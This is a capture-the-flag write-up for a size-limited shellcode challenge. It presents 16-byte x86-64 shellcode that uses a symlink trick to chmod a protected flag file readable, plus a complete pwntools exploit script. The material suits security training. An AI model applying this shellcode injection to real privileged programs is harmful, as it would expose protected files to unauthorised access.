# Challenge: Byte Budget
This is a hard one...
**Constraint:**
Shellcode max length = 18 bytes

**Analysis**
This constraint makes standard shellcode approaches impossible:

1. Standard execve("/bin/sh"): Too long (usually 20+ bytes).
2. Standard open/read/write: Far too long (30+ bytes).
3. Standard chmod("/flag", 4): Even this is tricky because constructing the string "/flag" takes up too much space.

The "String Construction" Problem
In x86-64 assembly, the string /flag is 5 bytes (0x2f666c6167).
To push this string onto the stack for the syscall:
```
mov rbx, 0x67616c662f  ; 10 bytes! (opcode + 64-bit immediate)
push rbx               ; 1 byte
mov rdi, rsp           ; 3 bytes
```
Just setting up the filename "/flag" takes ~14 bytes, leaving only 4 bytes for the rest of the logic (setting syscall number, arguments, and executing syscall). This will inevitably exceed 18 bytes.

**The Solution:** Symlink Optimization
To bypass the size limit, we need to shorten the filename. If the filename is 4 bytes or less, we can use a 32-bit push, which is significantly smaller in opcode size.

The Trick
We can use the Python script to create a symbolic link in the current directory before sending the shellcode.

Create a symlink: flag -> /flag.

Now we only need to chmod the file named "flag".

The string "flag" is 0x67616c66 (exactly 4 bytes).

Byte Calculation
Using "flag" allows us to use push imm32:
```
push 0x67616c66        ; 5 bytes (1 byte opcode + 4 bytes immediate)
mov rdi, rsp           ; 3 bytes
```

Total for string setup: 8 bytes.
This leaves us 10 bytes for the rest of the logic, which is enough!

3. The Shellcode (Assembly)
We will use the chmod syscall (syscall number 90) to change the file permissions to readable (mode 4).
```
/* 1. Set syscall number (rax = 90) */
push 90
pop rax         ; 3 bytes combined

/* 2. Set mode (rsi = 4, R_OK) */
push 4
pop rsi         ; 3 bytes combined

/* 3. Set filename (rdi = "flag") */
push 0x67616c66 ; "flag" - 5 bytes
mov rdi, rsp    ; rdi points to stack - 3 bytes

/* 4. Execute */
syscall         ; 2 bytes
```
Total Size: $3 + 3 + 5 + 3 + 2 = \mathbf{16 \text{ bytes}}$.This fits perfectly within the 18-byte limit.

```
#!/usr/bin/env python3
from pwn import *
import os

# Set context
context.arch = 'amd64'
binary_path = '/challenge/byte-budget'

def solve():
    # --- Step 1: Create the Symlink ---
    # We link local 'flag' to absolute '/flag'
    # This allows us to use a 4-byte filename ("flag") instead of 5-byte ("/flag")
    if os.path.exists("flag"):
        try:
            os.remove("flag")
        except:
            pass
    
    try:
        os.symlink("/flag", "flag")
        print("[+] Symlink created: flag -> /flag")
    except Exception as e:
        print(f"[-] Symlink creation failed: {e}")
        return

    # --- Step 2: Construct 16-byte Shellcode ---
    shellcode_asm = """
        /* chmod("flag", 4) */
        
        /* syscall 90 (chmod) */
        push 90
        pop rax
        
        /* mode 4 (Read) */
        push 4
        pop rsi
        
        /* filename "flag" */
        push 0x67616c66  /* "flag" in hex */
        mov rdi, rsp     /* rdi points to the string on stack */
        
        syscall
    """
    
    payload = asm(shellcode_asm)
    print(f"[*] Payload Length: {len(payload)} bytes")

    # --- Step 3: Execute ---
    p = process(binary_path)
    
    # Wait for the prompt
    p.recvuntil(b'Reading') 
    
    # Send shellcode
    p.send(payload)
    
    # Wait for execution
    time.sleep(1)
    
    # --- Step 4: Retrieve Flag ---
    print("\n[*] Reading flag from disk...")
    # The shellcode only changed permissions. 
    # We must read the file using standard tools now.
    flag_content = os.popen("cat flag").read()
    print(f"\n[SUCCESS] Flag: {flag_content}")

    p.close()

if __name__ == "__main__":
    solve()
```
